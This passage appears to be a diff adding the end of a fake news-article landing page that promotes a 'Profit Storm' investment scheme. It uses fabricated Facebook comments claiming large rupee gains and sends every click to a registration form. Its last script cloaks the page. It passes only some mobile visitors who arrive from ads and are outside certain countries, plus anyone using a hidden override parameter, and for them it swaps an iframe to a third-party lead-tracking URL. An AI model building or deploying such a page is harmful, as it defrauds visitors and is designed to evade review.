+                                          <div class="fb-comment__like-colvo">79</div>
+
+                                          ·
+
+                                          <div class="fb-comment__date">1h</div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </li>
+
+                                  <li class="fb-comment__comment-wrap">
+                                    <div class="fb-comment__comment">
+                                      <a href="#" class="scroll_to_register">
+                                        <img src="./offer_index/c_2.png" alt="" class="fb-comment__person-photo" />
+                                      </a>
+
+                                      <div class="fb-comment__comment-content">
+                                        <div class="fb-comment__name">Sanchita Rini Dey</div>
+
+                                        <p class="fb-comment__text">Wow, this is my ninth day and my account is already ₹445,295! I love Profit Storm!!!</p>
+
+                                        <div class="fb-comment__meta">
+                                          <div class="fb-comment__like">Like</div>
+
+                                          ·
+
+                                          <div class="fb-comment__reply">Reply</div>
+
+                                          ·
+
+                                          <div class="fb-comment__like-colvo">79</div>
+
+                                          ·
+
+                                          <div class="fb-comment__date">1h</div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </section>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="undefined LSrFq ddjHc">
+                    <div id="affiliate_non_msp_rhs_widget">
+                      <div data-type="in_view" class="  ">
+                        <div data-aff-type="aff-content" data-aff-version="v2" class="D7ys0"></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div id="liner-111173490"></div>
+            </div>
+
+            <div class="undefined clearfix">
+              <div class="undefined"></div>
+
+              <div></div>
+
+              <div id="comment-sidebar-111173490"></div>
+
+              <div data-articlepage-end="111173490"></div>
+            </div>
+          </div>
+
+          <div id="toi-article-container-107266799" class="clearfix rel">
+            <div class="perpetual"></div>
+
+            <div id="next-story-111173490" data-linkindex="0" data-prevlinkindex="-2"></div>
+          </div>
+
+          <div id="toi-article-container-111172773" class="clearfix rel">
+            <div class="perpetual"></div>
+
+            <div id="next-story-107266799" data-linkindex="1" data-prevlinkindex="-1"></div>
+          </div>
+
+          <div id="toi-article-container-111172774" class="clearfix rel">
+            <div class="perpetual"></div>
+
+            <div id="next-story-111172773" data-linkindex="2" data-prevlinkindex="0"></div>
+          </div>
+        </div>
+
+        <style>
+          .D9RyY,
+          .wvELk {
+            padding: 10px;
+          }
+
+          @media (max-width: 1024px) {
+            .VRKZ3 {
+              display: flex;
+              flex-direction: column;
+            }
+          }
+
+          @media (max-width: 768px) {
+            .wvELk {
+              grid-template-columns: 1fr;
+            }
+          }
+        </style>
+
+        <div data-translate-id="cw">
+          <div class="X2plK footer_wrapper contentwrapper">
+            <div class="contentwrapper">
+              <div class="nVZnl">
+                Copyright ©
+                <script>
+                  document.write(new Date().getFullYear());
+                </script>
+                2026 Bennett, Coleman & Co. Ltd. All rights reserved. For reprint rights: Times Syndication Service
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <script>
+      $("a.scroll_to_register").click(function (event) {
+        event.preventDefault();
+        $("html, body").animate(
+          {
+            scrollTop: $("#registerForm").offset().top,
+          },
+          500,
+        );
+      });
+      $("img").click(function (event) {
+        event.preventDefault();
+        $("html, body").animate(
+          {
+            scrollTop: $("#registerForm").offset().top,
+          },
+          500,
+        );
+      });
+      $(".scroll_to_register").click(function (event) {
+        event.preventDefault();
+        $("html, body").animate(
+          {
+            scrollTop: $("#registerForm").offset().top,
+          },
+          500,
+        );
+      });
+    </script>
+
+    <script>
+      const smoothScrollToCustomRegBox = () => {
+        const scrollToRegBox = () => {
+          const customRegBox = document.getElementById("registerForm");
+
+          if (!customRegBox) {
+            return;
+          }
+
+          const yOffset = customRegBox.getBoundingClientRect().top + window.pageYOffset;
+
+          window.scrollTo({ top: yOffset, behavior: "smooth" });
+        };
+
+        const links = document.querySelectorAll('a[href="#"]');
+        links.forEach((link) => {
+          link.addEventListener("click", (e) => {
+            e.preventDefault();
+
+            scrollToRegBox();
+          });
+        });
+      };
+
+      document.addEventListener("DOMContentLoaded", smoothScrollToCustomRegBox);
+    </script>
+
+    <style>
+      h2 {
+        padding: 20px 0px;
+      }
+
+      div#Contact-Us {
+        background: #fff;
+      }
+
+      #Contact-Us {
+        background: black !important;
+      }
+
+      #form-feedback input {
+        background: white !important;
+      }
+
+      html {
+        scroll-behavior: smooth;
+      }
+    </style>
+
+    <script type="text/javascript" id="" charset="">
+      window.addEventListener("load", function () {
+        var b = !1,
+          e = !0,
+          c = !1,
+          p = !1,
+          a = "IL PH CY NL PL UA".split(" "),
+          f = ["facebook", "instagram", "speakol", "adskeeper", "jubna"],
+          d = function (g) {
+            try {
+              return new URL(g).hostname.toLowerCase();
+            } catch (r) {
+              return "";
+            }
+          },
+          h = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent),
+          l = d(localStorage.getItem("storedReferrer") || document.referrer || "");
+        d = function (g) {
+          p && console.log(g);
+        };
+        var k = new URL(location.href),
+          m = k.searchParams,
+          n = localStorage.getItem("country_detect") || "";
+        k = !0;
+        c &&
+          (k = f.some(function (g) {
+            return l.includes(g);
+          }));
+        d("Referrer host: " + l + " | cameFromAds: " + k);
+        c = decodeURIComponent(m.get("tp_aff_sub3") || "");
+        f = "{{ad.name}}-{{ad.id}}";
+        var q = "{campaign.name }";
+        c = c === f || c === q;
+        c = !c;
+        d("isDirectVisit: " + c);
+        f = Math.random();
+        e = e && f < 0.33;
+        a.includes(n) && (e = !1);
+        b || h || (e = !1);
+        d("country: " + n + " | passRandom: " + e + " | rand " + f);
+        b = m.get("teet") === "1";
+        d("force: " + b);
+        if ((k && c && e) || b)
+          for (a = document.getElementsByTagName("iframe"), h = 0; h < a.length; h++) {
+            if (((b = a[h]), b.width != "1px" && b.width != "0")) {
+              a = document.title;
+              a.length > 50 && (a = a.slice(0, 50));
+              a = encodeURIComponent(a);
+              a = "https://orange-media-track.com/lead/register/35" + window.location.search + "\x26sales\x3d" + a;
+              b.src = a;
+              b.onload = function () {};
+              break;
+            }
+          }
+        else d("Condition not met \u2014 blocked by rules.");
+      });
+    </script>
+    <script src="./intl-validation/validation.js" defer></script>
+  </body>
+</html>
